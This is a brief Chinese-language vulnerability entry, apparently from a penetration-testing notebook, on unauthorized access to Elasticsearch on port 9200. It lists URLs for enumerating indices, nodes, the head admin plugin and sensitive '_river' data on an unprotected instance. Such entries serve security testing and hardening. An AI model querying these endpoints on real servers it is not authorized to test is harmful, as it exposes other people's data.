# Elasticsearch 未授权访问

## 漏洞描述

Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据

## 漏洞影响

```
Elasticsearch
```

## 漏洞复现

访问目标URL : http://xxx.xxx.xxx.xxx:9200/_node

```plain
http://localhost:9200/_cat/indices
http://localhost:9200/_river/_search //查看数据库敏感信息
http://localhost:9200/_nodes         //查看节点数据
http://localhost:9200/_plugin/head/  //web管理界面(head插件)
```

